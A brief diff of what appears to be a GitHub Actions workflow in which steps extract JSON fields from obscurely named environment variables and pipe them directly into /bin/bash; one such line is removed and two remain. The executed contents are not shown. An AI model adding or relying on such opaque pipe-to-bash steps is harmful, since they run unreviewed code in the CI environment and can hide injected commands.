@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$ydbn17" | jq -r .ztlr610 | /bin/bash
           echo $q61657 | jq -r .svwp61 | /bin/bash
-          echo $u8180 | jq -r .sfqks4660 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
